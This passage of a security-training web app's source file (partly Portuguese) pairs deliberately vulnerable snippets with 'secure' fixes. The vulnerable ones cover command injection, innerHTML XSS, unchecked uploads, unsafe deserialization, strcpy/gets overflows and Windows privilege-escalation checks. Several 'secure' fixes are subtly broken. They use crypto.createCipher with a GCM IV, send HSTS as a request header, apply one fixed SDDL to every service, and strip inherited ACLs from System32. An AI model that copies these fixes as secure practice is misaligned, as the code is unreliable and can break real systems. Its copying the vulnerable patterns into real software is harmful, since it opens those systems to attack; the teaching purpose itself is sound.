reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" /v "ScheduledInstallTime" /t REG_DWORD /d 3 /f

# Install PowerShell module for update management
Install-Module PSWindowsUpdate -Force

# Check for and install critical security updates
Get-WUList | Where-Object {$_.Title -like "*Security*" -or $_.Title -like "*Critical*"}
Get-WUInstall -KBArticleID "KB1234567" -AcceptAll -AutoReboot

# Configure update exclusions carefully (only when absolutely necessary)
# Hide specific updates that cause issues
Hide-WUUpdate -KBArticleID "KB1234567" -Title "Problematic Update"

# Create update installation script with error handling
$Updates = Get-WUList | Where-Object {$_.MsrcSeverity -eq "Critical"}
foreach ($Update in $Updates) {
    try {
        Get-WUInstall -KBArticleID $Update.KB -AcceptAll -IgnoreReboot
        Write-Host "Successfully installed: $($Update.Title)"
    } catch {
        Write-Error "Failed to install: $($Update.Title) - Error: $($_.Exception.Message)"
    }
}

# Monitor update history and status
Get-WUHistory | Where-Object {$_.Date -gt (Get-Date).AddDays(-30)} | Select-Object Date, Title, Result
Get-WURebootStatus`,
              explanation: "Proper Windows Update management includes automated update policies, selective installation of critical updates, proper testing procedures, and comprehensive monitoring and reporting."
            },
            prevention: [
              "Enable automatic installation of critical security updates",
              "Establish testing environment for update validation",
              "Configure maintenance windows for update installation",
              "Regular monitoring of update installation status and failures",
              "Implement Windows Server Update Services (WSUS) for enterprise control"
            ]
          }
        },
        {
          id: "windows-privilege-escalation-prevention",
          title: "Windows Privilege Escalation Prevention",
          type: "practical",
          content: {
            theory: "Privilege escalation occurs when an attacker gains elevated access rights beyond their initial level of authorization. In Windows environments, this often involves exploiting misconfigurations, weak service permissions, unpatched vulnerabilities, or insecure file/registry permissions. Understanding common privilege escalation vectors and implementing appropriate preventive measures is crucial for maintaining the principle of least privilege and protecting against advanced persistent threats.",
            vulnerability: {
              code: `# VULNERABLE - Common privilege escalation vulnerabilities
# Check for services with weak permissions (exploitable by non-admin users)
Get-WmiObject -Class Win32_Service | ForEach-Object {
    $serviceName = $_.Name
    $acl = (Get-Acl -Path "HKLM:\\System\\CurrentControlSet\\Services\\$serviceName").Access
    $acl | Where-Object {$_.IdentityReference -like "*Users*" -and $_.AccessControlType -eq "Allow"}
}

# Unquoted service paths (DLL hijacking vulnerability)
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notlike '"*"' -and $_.PathName -like "* *"
} | Select-Object Name, PathName

# Check for writable directories in system PATH
$env:PATH -split ';' | ForEach-Object {
    if (Test-Path $_) {
        $acl = Get-Acl -Path $_
        $acl.Access | Where-Object {$_.IdentityReference -like "*Users*" -and $_.FileSystemRights -like "*Write*"}
    }
}

# AlwaysInstallElevated vulnerability (MSI packages run as SYSTEM)
$regPaths = @(
    "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
    "HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
)
foreach ($path in $regPaths) {
    Get-ItemProperty -Path $path -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
}`,
              explanation: "Common privilege escalation vulnerabilities include weak service permissions, unquoted service paths, writable system directories, and dangerous registry settings that allow standard users to gain administrative privileges."
            },
            secure: {
              code: `# SECURE - Comprehensive privilege escalation prevention
# Fix unquoted service paths
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notlike '"*"' -and $_.PathName -like "* *"
} | ForEach-Object {
    $serviceName = $_.Name
    $currentPath = $_.PathName
    $quotedPath = '"' + $currentPath + '"'
    sc config $serviceName binPath= $quotedPath
    Write-Host "Fixed unquoted path for service: $serviceName"
}

# Secure service permissions (remove excessive permissions for Users group)
$services = Get-WmiObject -Class Win32_Service
foreach ($service in $services) {
    $serviceName = $service.Name
    # Use sc.exe to set secure permissions (only Administrators and SYSTEM)
    sc sdset $serviceName "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
}

# Secure system directory permissions
$systemDirs = @("C:\\Windows\\System32", "C:\\Windows\\SysWOW64", "C:\\Program Files", "C:\\Program Files (x86)")
foreach ($dir in $systemDirs) {
    if (Test-Path $dir) {
        $acl = Get-Acl -Path $dir
        # Remove write permissions for Users group
        $acl.SetAccessRuleProtection($true, $false)
        $acl.SetAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("Users", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        Set-Acl -Path $dir -AclObject $acl
    }
}

# Disable AlwaysInstallElevated if enabled
$regPaths = @(
    "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
    "HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
)
foreach ($path in $regPaths) {
    if (Test-Path $path) {
        Set-ItemProperty -Path $path -Name "AlwaysInstallElevated" -Value 0 -Force
    }
}

# Enable additional security measures
# Disable cached credentials
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "CachedLogonsCount" /t REG_SZ /d "0" /f

# Configure User Account Control for maximum security
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 2 /f
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 3 /f
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableInstallerDetection" /t REG_DWORD /d 1 /f

# Regular privilege escalation vulnerability assessment
Write-Host "Running privilege escalation vulnerability check..."
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | Measure-Object | Select-Object Count`,
              explanation: "Comprehensive privilege escalation prevention involves fixing service vulnerabilities, securing file/registry permissions, disabling dangerous features, and implementing continuous monitoring."
            },
            prevention: [
              "Regular audit of service permissions and fix weak configurations",
              "Implement principle of least privilege for all user accounts",
              "Keep systems updated with latest security patches",
              "Use User Account Control (UAC) with highest security settings",
              "Regular vulnerability assessments focusing on privilege escalation vectors"
            ]
          }
        }
      ]
    },
    "network-protocols": {
      title: "Network Protocols", // Nome técnico preservado
      descriptionKey: "learn.network_protocols_desc",
      progress: 0,
      totalLessons: 6,
      sections: [
        {
          id: "tcp-ip-fundamentals",
          title: "TCP/IP Stack Fundamentals",
          type: "theory",
          content: {
            theory: "O modelo TCP/IP define como os dados são transmitidos pela internet através de quatro camadas principais: Application, Transport, Internet, e Network Access. Cada camada tem responsabilidades específicas e protocolos associados.",
            keyPoints: [
              "Application Layer: HTTP/HTTPS, FTP, DNS, SMTP",
              "Transport Layer: TCP (confiável) e UDP (rápido)",
              "Internet Layer: IP, ICMP, routing",
              "Network Access Layer: Ethernet, WiFi, hardware"
            ]
          }
        },
        {
          id: "dns-security",
          title: "DNS Security Vulnerabilities",
          type: "practical",
          content: {
            theory: "O Domain Name System (DNS) traduz nomes de domínio em endereços IP, mas pode ser vulnerável a diversos ataques como DNS Spoofing, Cache Poisoning e Hijacking.",
            vulnerability: {
              code: `# VULNERABLE - DNS Query sem validação
dig example.com @8.8.8.8

# Configuração DNS insegura
# /etc/resolv.conf
nameserver 8.8.8.8
nameserver 1.1.1.1

# Sem validação DNSSEC
# Vulnerável a man-in-the-middle
# Cache poisoning possível`,
              explanation: "Consultas DNS sem validação DNSSEC podem ser interceptadas e modificadas por atacantes."
            },
            secure: {
              code: `# SECURE - DNS com DNSSEC e DoH
# Configuração segura do DNS
# /etc/systemd/resolved.conf
[Resolve]
DNS=1.1.1.1#cloudflare-dns.com 8.8.8.8#dns.google
DNSSEC=yes
DNSOverTLS=yes
FallbackDNS=9.9.9.9#dns.quad9.net

# Validação DNSSEC
dig +dnssec example.com

# DNS over HTTPS (DoH) com curl
curl -H 'accept: application/dns-json' \
  'https://cloudflare-dns.com/dns-query?name=example.com&type=A'`,
              explanation: "DNSSEC valida a integridade das respostas DNS, enquanto DNS over TLS/HTTPS criptografa as consultas."
            },
            prevention: [
              "Habilitar DNSSEC para validação de integridade",
              "Usar DNS over HTTPS (DoH) ou DNS over TLS (DoT)",
              "Configurar servidores DNS confiáveis",
              "Monitorar consultas DNS por anomalias"
            ]
          }
        },
        {
          id: "http-https-security",
          title: "HTTP vs HTTPS Security",
          type: "practical", 
          content: {
            theory: "HTTP transmite dados em texto plano, enquanto HTTPS usa TLS/SSL para criptografar a comunicação. A diferença é crítica para a segurança de dados sensíveis.",
            vulnerability: {
              code: `// VULNERABLE - Cliente HTTP
fetch('http://api.example.com/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    username: 'user@example.com',
    password: 'mypassword123'
  })
});

// Dados transmitidos em texto plano
// Vulnerável a packet sniffing
// Sem validação de integridade
// Sem autenticação do servidor`,
              explanation: "HTTP transmite credenciais em texto plano, permitindo interceptação por atacantes."
            },
            secure: {
              code: `// SECURE - Cliente HTTPS com validações
const https = require('https');

const agent = new https.Agent({
  rejectUnauthorized: true,
  checkServerIdentity: (hostname, cert) => {
    // Validação adicional do certificado
    return undefined; // sem erro = certificado válido
  }
});

fetch('https://api.example.com/login', {
  method: 'POST',
  agent: agent,
  headers: {
    'Content-Type': 'application/json',
    'Strict-Transport-Security': 'max-age=31536000'
  },
  body: JSON.stringify({
    username: 'user@example.com',
    password: 'mypassword123'
  })
});

// Dados criptografados com TLS
// Validação de certificado
// Integridade garantida
// Autenticação do servidor`,
              explanation: "HTTPS com validação rigorosa de certificados garante comunicação segura e autenticada."
            },
            prevention: [
              "Usar sempre HTTPS para dados sensíveis",
              "Implementar HSTS (HTTP Strict Transport Security)",
              "Validar certificados SSL/TLS rigorosamente",
              "Usar Certificate Pinning quando apropriado"
            ]
          }
        }
      ]
    },
    "firewalls-ids": {
      title: "Firewalls & IDS", // Nome técnico preservado  
      descriptionKey: "learn.firewalls_ids_desc",
      progress: 0,
      totalLessons: 8,
      sections: [
        {
          id: "firewall-types",
          title: "Types of Firewalls",
          type: "theory",
          content: {
            theory: "Firewalls são sistemas de segurança que controlam o tráfego de rede baseado em regras predefinidas. Existem diferentes tipos: Network Firewalls (camada 3-4), Application Firewalls/WAF (camada 7), e Next-Generation Firewalls que combinam múltiplas funcionalidades.",
            keyPoints: [
              "Network Firewalls: Filtram por IP, porta e protocolo",
              "Application Firewalls (WAF): Analisam conteúdo HTTP/HTTPS",
              "Next-Gen Firewalls (NGFW): Deep packet inspection + threat intelligence",
              "Stateful vs Stateless: Controle de conexões estabelecidas"
            ]
          }
        },
        {
          id: "iptables-configuration",
          title: "iptables Configuration",
          type: "practical",
          content: {
            theory: "iptables é o firewall padrão do Linux, permitindo controle granular do tráfego através de regras organizadas em chains (INPUT, OUTPUT, FORWARD) e tables (filter, nat, mangle).",
            vulnerability: {
              code: `# VULNERABLE - Configuração permissiva
#!/bin/bash

# Aceitar TUDO por padrão (PERIGOSO!)
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

# Flush todas as regras
iptables -F

# Permitir SSH de qualquer lugar
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Permitir HTTP/HTTPS sem rate limiting
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# SEM proteção contra:
# - Ataques de força bruta
# - Port scanning
# - DDoS
# - Conexões maliciosas`,
              explanation: "Políticas permissivas por padrão deixam o sistema exposto a diversos tipos de ataques."
            },
            secure: {
              code: `# SECURE - Configuração restritiva
#!/bin/bash

# NEGAR tudo por padrão (princípio do menor privilégio)
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

# Permitir loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Permitir conexões estabelecidas
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED -j ACCEPT

# SSH com proteção contra brute force
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --set --name SSH_ATTACKS --rsource
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --update --seconds 60 --hitcount 4 \
  --name SSH_ATTACKS --rsource -j DROP
iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT

# HTTP/HTTPS com rate limiting
iptables -A INPUT -p tcp --dport 80 -m limit \
  --limit 50/minute --limit-burst 100 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -m limit \
  --limit 50/minute --limit-burst 100 -j ACCEPT

# Bloquear port scanning
iptables -A INPUT -m recent --name portscan --rcheck \
  --seconds 86400 -j DROP
iptables -A INPUT -m recent --name portscan --remove
iptables -A INPUT -p tcp -m tcp --tcp-flags ALL FIN,URG,PSH \
  -m recent --name portscan --set -j DROP

# Log tentativas bloqueadas
iptables -A INPUT -m limit --limit 10/minute \
  -j LOG --log-prefix "FIREWALL-DROPPED: " --log-level 4

# Salvar regras
iptables-save > /etc/iptables/rules.v4`,
              explanation: "Configuração defensiva com rate limiting, proteção contra brute force e logging adequado."
            },
            prevention: [
              "Implementar default-deny policies",
              "Usar rate limiting para prevenir DDoS",
              "Configurar proteção contra port scanning",
              "Implementar logging e monitoramento"
            ]
          }
        },
        {
          id: "ids-vs-ips",
          title: "IDS vs IPS Systems",
          type: "practical",
          content: {
            theory: "Intrusion Detection Systems (IDS) monitoram e alertam sobre atividades suspeitas, enquanto Intrusion Prevention Systems (IPS) podem ativamente bloquear ataques em tempo real.",
            vulnerability: {
              code: `# VULNERABLE - Sem monitoramento
# Sistema sem IDS/IPS
# Ataques passam despercebidos
# Sem alertas automatizados
# Resposta manual lenta

# Log básico apenas
tail -f /var/log/auth.log
tail -f /var/log/apache2/access.log

# Sem análise automatizada
# Sem correlação de eventos
# Sem resposta automatizada`,
              explanation: "Sistemas sem IDS/IPS ficam vulneráveis a ataques não detectados."
            },
            secure: {
              code: `# SECURE - Suricata IDS/IPS
# /etc/suricata/suricata.yaml
af-packet:
  - interface: eth0
    threads: 4
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes

default-rule-path: /var/lib/suricata/rules
rule-files:
  - suricata.rules
  - emerging-threats.rules

# Regras personalizadas
# /var/lib/suricata/rules/custom.rules
alert tcp any any -> any 22 (msg:"SSH Brute Force Attempt"; \
  flow:to_server,new; threshold:type both,track by_src,count 5,seconds 60; \
  classtype:attempted-admin; sid:1001; rev:1;)

alert http any any -> any any (msg:"SQL Injection Attempt"; \
  content:"union select"; nocase; pcre:"/union\\s+select/i"; \
  classtype:web-application-attack; sid:1002; rev:1;)

# Iniciar Suricata em modo IPS
suricata -c /etc/suricata/suricata.yaml -q 0

# Monitoramento com ELK Stack
filebeat -c /etc/filebeat/filebeat.yml`,
              explanation: "IDS/IPS automatizado com regras atualizadas e integração para análise avançada."
            },
            prevention: [
              "Implementar IDS/IPS com regras atualizadas",
              "Configurar alertas automatizados",
              "Integrar com SIEM para correlação",
              "Manter threat intelligence atualizada"
            ]
          }
        }
      ]
    },
    "encryption-pki": {
      title: "Encryption & PKI", // Nome técnico preservado
      descriptionKey: "learn.encryption_pki_desc", 
      progress: 0,
      totalLessons: 10,
      sections: [
        {
          id: "symmetric-asymmetric",
          title: "Symmetric vs Asymmetric Encryption",
          type: "theory",
          content: {
            theory: "Criptografia simétrica usa a mesma chave para criptografar e descriptografar (rápida, mas requer troca segura de chaves). Criptografia assimétrica usa par de chaves pública/privada (mais lenta, mas permite troca segura).",
            keyPoints: [
              "Simétrica: AES-256, ChaCha20 - rápida para grandes volumes",
              "Assimétrica: RSA-4096, ECDSA, Ed25519 - segura para troca de chaves",
              "Híbrida: Combina ambas (TLS/SSL usa este modelo)",
              "Funções Hash: SHA-256, SHA-3 para integridade"
            ]
          }
        },
        {
          id: "aes-implementation",
          title: "Secure AES Implementation",
          type: "practical",
          content: {
            theory: "AES (Advanced Encryption Standard) é o padrão de criptografia simétrica. Implementação segura requer modo adequado (GCM), IV único e gerenciamento seguro de chaves.",
            vulnerability: {
              code: `// VULNERABLE - AES inseguro
const crypto = require('crypto');

// Chave hardcoded - TERRÍVEL!
const key = 'mySecretKey12345';

// ECB mode - INSEGURO!
function encryptData(text) {
  const cipher = crypto.createCipher('aes-128-ecb', key);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}

// Sem salt/IV - VULNERÁVEL
function decryptData(encrypted) {
  const decipher = crypto.createDecipher('aes-128-ecb', key);
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

// MD5 para hash - QUEBRADO!
function hashPassword(password) {
  return crypto.createHash('md5').update(password).digest('hex');
}`,
              explanation: "Uso de ECB mode, chaves fracas e algoritmos obsoletos tornam a criptografia vulnerável."
            },
            secure: {
              code: `// SECURE - AES-256-GCM seguro
const crypto = require('crypto');

// Geração segura de chave
function generateKey() {
  return crypto.randomBytes(32); // 256 bits
}

// AES-256-GCM com autenticação
function encryptData(plaintext, key) {
  const iv = crypto.randomBytes(12); // 96-bit IV para GCM
  const cipher = crypto.createCipher('aes-256-gcm', key, iv);
  
  let ciphertext = cipher.update(plaintext, 'utf8', 'hex');
  ciphertext += cipher.final('hex');
  
  const authTag = cipher.getAuthTag();
  
  return {
    ciphertext,
    iv: iv.toString('hex'),
    authTag: authTag.toString('hex')
  };
}

function decryptData(encryptedData, key) {
  const decipher = crypto.createDecipher('aes-256-gcm', key, 
    Buffer.from(encryptedData.iv, 'hex'));
  
  decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
  
  let plaintext = decipher.update(encryptedData.ciphertext, 'hex', 'utf8');
  plaintext += decipher.final('utf8');
  
  return plaintext;
}

// Hash seguro com salt
function hashPassword(password) {
  const salt = crypto.randomBytes(32);
  const hash = crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512');
  
  return {
    hash: hash.toString('hex'),
    salt: salt.toString('hex')
  };
}

// Key derivation segura
function deriveKey(password, salt) {
  return crypto.pbkdf2Sync(password, salt, 100000, 32, 'sha256');
}`,
              explanation: "AES-GCM fornece criptografia e autenticação, IVs únicos previnem ataques replay, e PBKDF2 fortalece senhas."
            },
            prevention: [
              "Usar apenas modos autenticados (GCM, CCM)",
              "Gerar IVs únicos e aleatórios",
              "Implementar key derivation segura (PBKDF2, scrypt)",
              "Nunca reutilizar chaves ou IVs"
            ]
          }
        },
        {
          id: "pki-certificates",
          title: "PKI and Digital Certificates",
          type: "practical",
          content: {
            theory: "Public Key Infrastructure (PKI) é o framework para criação, gerenciamento e revogação de certificados digitais. Inclui Certificate Authorities (CAs), Certificate Revocation Lists (CRLs) e OCSP.",
            vulnerability: {
              code: `# VULNERABLE - Certificado auto-assinado sem validação
# Criação insegura
openssl req -x509 -newkey rsa:1024 -keyout key.pem -out cert.pem \
  -days 9999 -nodes -subj "/CN=example.com"

# Cliente sem validação
curl -k https://example.com/api  # -k ignora erros SSL!

# Servidor Node.js inseguro
const https = require('https');
const options = {
  key: fs.readFileSync('key.pem'),
  cert: fs.readFileSync('cert.pem'),
  // Sem validação de cliente
  rejectUnauthorized: false  // PERIGOSO!
};`,
              explanation: "Certificados fracos e validação desabilitada eliminam as garantias de segurança do TLS."
            },
            secure: {
              code: `# SECURE - PKI completa com CA
# 1. Criar Certificate Authority Root
openssl genrsa -aes256 -out ca-private-key.pem 4096

openssl req -new -x509 -days 3650 -key ca-private-key.pem \
  -out ca-certificate.pem -config ca.conf

# ca.conf
[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_ca

[req_distinguished_name]
CN = MyCompany Root CA

[v3_ca]
basicConstraints = critical,CA:true
keyUsage = critical,keyCertSign,cRLSign
subjectKeyIdentifier = hash

# 2. Certificado de servidor
openssl genrsa -out server-private-key.pem 2048

openssl req -new -key server-private-key.pem \
  -out server.csr -config server.conf

# server.conf
[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req

[v3_req]
basicConstraints = CA:FALSE
keyUsage = digitalSignature, keyEncipherment
subjectAltName = @alt_names

[alt_names]
DNS.1 = api.example.com
DNS.2 = www.api.example.com

# 3. Assinar com CA
openssl x509 -req -in server.csr -CA ca-certificate.pem \
  -CAkey ca-private-key.pem -CAcreateserial \
  -out server-certificate.pem -days 365 \
  -extensions v3_req -extfile server.conf

# 4. Servidor Node.js seguro
const options = {
  key: fs.readFileSync('server-private-key.pem'),
  cert: fs.readFileSync('server-certificate.pem'),
  ca: fs.readFileSync('ca-certificate.pem'),
  
  // Apenas TLS 1.2+
  minVersion: 'TLSv1.2',
  
  // Cipher suites seguros
  ciphers: 'ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256',
  honorCipherOrder: true
};`,
              explanation: "PKI adequada com CA própria, certificados válidos e configuração TLS robusta."
            },
            prevention: [
              "Usar CA confiável ou criar PKI própria",
              "Implementar certificate pinning crítico",
              "Configurar OCSP stapling",
              "Monitorar Certificate Transparency logs"
            ]
          }
        }
      ]
    },
    "system-hardening": {
      title: "System Hardening Techniques",
      description: "Comprehensive system hardening strategies for enhanced security",
      progress: 0,
      totalLessons: 16,
      sections: [
        {
          id: "service-hardening",
          title: "Service and Process Hardening",
          type: "practical",
          content: {
            theory: "System hardening involves disabling unnecessary services, securing configurations, and implementing security controls to reduce attack surface.",
            vulnerability: {
              code: `# VULNERABLE - Default service configuration
# SSH with default settings
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes

# Multiple unnecessary services running
systemctl status telnet
systemctl status ftp
systemctl status rsh`,
              explanation: "Default configurations often prioritize functionality over security, leaving systems vulnerable."
            },
            secure: {
              code: `# SECURE - Hardened SSH configuration
Port 2222                    # Non-standard port
PermitRootLogin no          # Disable root login
PasswordAuthentication no   # Key-based auth only
AllowUsers specificuser     # Limit user access
MaxAuthTries 3             # Limit login attempts

# Disable unnecessary services
systemctl disable telnet
systemctl disable rsh
systemctl stop unnecessary-services`,
              explanation: "Hardened configurations reduce attack vectors and implement security best practices."
            },
            prevention: [
              "Disable unnecessary services and ports",
              "Implement strong authentication mechanisms",
              "Regular security updates and patches",
              "Use security frameworks (CIS benchmarks)"
            ]
          }
        }
      ]
    }
  },
  "programming-security": {
    "python-security": {
      title: "Secure Python Development",
      description: "Security best practices for Python applications",
      progress: 0,
      totalLessons: 20,
      sections: [
        {
          id: "input-sanitization",
          title: "Input Sanitization in Python",
          type: "practical",
          content: {
            theory: "Proper input validation and sanitization are crucial to prevent injection attacks in Python applications.",
            vulnerability: {
              code: `# VULNERABLE - Command injection
import os
user_input = input("Enter filename: ")
os.system(f"cat {user_input}")`,
              explanation: "Direct execution of user input can lead to command injection attacks."
            },
            secure: {
              code: `# SECURE - Proper input validation
import os
import re
user_input = input("Enter filename: ")
if re.match(r'^[a-zA-Z0-9._-]+$', user_input):
    with open(user_input, 'r') as f:
        print(f.read())
else:
    print("Invalid filename")`,
              explanation: "Input validation and safe file operations prevent injection attacks."
            },
            prevention: [
              "Validate all input against expected patterns",
              "Use parameterized queries for database operations",
              "Avoid direct system command execution",
              "Implement proper error handling"
            ]
          }
        }
      ]
    },
    "javascript-security": {
      title: "Secure JavaScript/Node.js Development",
      description: "Security practices for JavaScript and Node.js applications",
      progress: 0,
      totalLessons: 18,
      sections: [
        {
          id: "xss-prevention",
          title: "XSS Prevention in JavaScript",
          type: "practical",
          content: {
            theory: "Cross-Site Scripting (XSS) vulnerabilities occur when user input is directly inserted into the DOM without proper sanitization.",
            vulnerability: {
              code: `// VULNERABLE - Direct DOM manipulation
function displayMessage(message) {
    document.getElementById('output').innerHTML = message;
}`,
              explanation: "Directly setting innerHTML with user input can execute malicious scripts."
            },
            secure: {
              code: `// SECURE - Safe DOM manipulation
function displayMessage(message) {
    const element = document.getElementById('output');
    element.textContent = message; // Safe text insertion
    // Or use DOMPurify for HTML sanitization
    // element.innerHTML = DOMPurify.sanitize(message);
}`,
              explanation: "Using textContent or proper sanitization prevents XSS attacks."
            },
            prevention: [
              "Use textContent instead of innerHTML when possible",
              "Implement Content Security Policy (CSP)",
              "Sanitize HTML input with trusted libraries",
              "Validate and encode output appropriately"
            ]
          }
        }
      ]
    },
    "php-security": {
      title: "Secure PHP Development",
      description: "Security best practices for PHP web applications",
      progress: 0,
      totalLessons: 16,
      sections: [
        {
          id: "file-upload-security",
          title: "Secure File Upload Implementation",
          type: "practical",
          content: {
            theory: "File upload functionality can be exploited to upload malicious files, leading to code execution and system compromise.",
            vulnerability: {
              code: `<?php
// VULNERABLE - No file validation
if (isset($_FILES['upload'])) {
    $target = "uploads/" . $_FILES['upload']['name'];
    move_uploaded_file($_FILES['upload']['tmp_name'], $target);
    echo "File uploaded successfully!";
}
?>`,
              explanation: "Accepting any file type without validation allows attackers to upload malicious scripts."
            },
            secure: {
              code: `<?php
// SECURE - Proper file validation
$allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
$maxSize = 5 * 1024 * 1024; // 5MB

if (isset($_FILES['upload'])) {
    $file = $_FILES['upload'];
    
    // Validate file type
    if (!in_array($file['type'], $allowedTypes)) {
        die('Invalid file type');
    }
    
    // Validate file size
    if ($file['size'] > $maxSize) {
        die('File too large');
    }
    
    // Generate safe filename
    $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
    $filename = uniqid() . '.' . $extension;
    $target = "uploads/" . $filename;
    
    move_uploaded_file($file['tmp_name'], $target);
}
?>`,
              explanation: "Proper validation and secure filename generation prevent malicious file uploads."
            },
            prevention: [
              "Validate file types and extensions",
              "Implement file size limits",
              "Generate secure filenames",
              "Store uploads outside web root"
            ]
          }
        }
      ]
    },
    "java-security": {
      title: "Secure Java Development",
      description: "Security practices for Java enterprise applications",
      progress: 0,
      totalLessons: 22,
      sections: [
        {
          id: "deserialization-security",
          title: "Secure Object Deserialization",
          type: "practical",
          content: {
            theory: "Unsafe deserialization can lead to remote code execution when untrusted data is deserialized without proper validation.",
            vulnerability: {
              code: `// VULNERABLE - Unsafe deserialization
import java.io.*;

public class UnsafeDeserializer {
    public Object deserialize(byte[] data) {
        try {
            ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data)
            );
            return ois.readObject(); // Dangerous!
        } catch (Exception e) {
            return null;
        }
    }
}`,
              explanation: "Deserializing untrusted data can execute malicious code through specially crafted objects."
            },
            secure: {
              code: `// SECURE - Safe deserialization with validation
import java.io.*;
import java.util.Set;

public class SecureDeserializer {
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.example.SafeClass",
        "com.example.TrustedClass"
    );
    
    public Object deserialize(byte[] data) {
        try {
            ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data)
            ) {
                @Override
                protected Class<?> resolveClass(ObjectStreamClass desc)
                        throws IOException, ClassNotFoundException {
                    if (!ALLOWED_CLASSES.contains(desc.getName())) {
                        throw new SecurityException("Unauthorized class: " + desc.getName());
                    }
                    return super.resolveClass(desc);
                }
            };
            return ois.readObject();
        } catch (Exception e) {
            throw new SecurityException("Deserialization failed", e);
        }
    }
}`,
              explanation: "Whitelist-based validation ensures only trusted classes can be deserialized."
            },
            prevention: [
              "Validate deserialized classes against whitelist",
              "Use JSON or XML instead of native serialization",
              "Implement integrity checks on serialized data",
              "Avoid deserializing untrusted data"
            ]
          }
        }
      ]
    },
    "c-cpp-security": {
      title: "Secure C/C++ Development",
      description: "Memory safety and security practices for C/C++ applications",
      progress: 0,
      totalLessons: 18,
      sections: [
        {
          id: "buffer-overflow-prevention",
          title: "Buffer Overflow Prevention",
          type: "practical",
          content: {
            theory: "Buffer overflows occur when programs write data beyond the boundaries of allocated memory, potentially leading to code execution.",
            vulnerability: {
              code: `// VULNERABLE - Buffer overflow risk
#include <stdio.h>
#include <string.h>

void vulnerable_function(char* input) {
    char buffer[64];
    strcpy(buffer, input); // Dangerous!
    printf("Input: %s\\n", buffer);
}

int main() {
    char user_input[1000];
    gets(user_input); // Also dangerous!
    vulnerable_function(user_input);
    return 0;
}`,
              explanation: "Using unsafe functions like strcpy() and gets() can cause buffer overflows with malicious input."
            },
            secure: {
              code: `// SECURE - Buffer overflow prevention
#include <stdio.h>
#include <string.h>

void secure_function(const char* input) {
    char buffer[64];
    
    // Use safe string functions
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\\0'; // Ensure null termination
    
    printf("Input: %s\\n", buffer);
}

int main() {
    char user_input[1000];
    
    // Use safe input function
    if (fgets(user_input, sizeof(user_input), stdin) != NULL) {
        // Remove newline if present
        user_input[strcspn(user_input, "\\n")] = '\\0';
        secure_function(user_input);
    }
    
    return 0;
}`,
              explanation: "Using secure functions with bounds checking prevents buffer overflows."
            },
            prevention: [
              "Use safe string functions (strncpy, snprintf)",
              "Enable compiler security features (-fstack-protector)",
              "Implement Address Space Layout Randomization (ASLR)",
              "Use static analysis tools to detect vulnerabilities"
            ]
          }
        }
      ]
    }
  }
};

const CodeBlock = ({ code, title, type = "vulnerable" }: { code: string; title: string; type?: "vulnerable" | "secure" }) => {
  const [isVisible, setIsVisible] = useState(true);
  const [copied, setCopied] = useState(false);

  const copyCode = async () => {
    await navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const getTypeColor = () => {
    switch (type) {
      case "vulnerable":
        return "border-danger bg-danger/5";
      case "secure":
        return "border-success bg-success/5";
      default:
        return "border-muted";
    }
  };

  const getTypeIcon = () => {
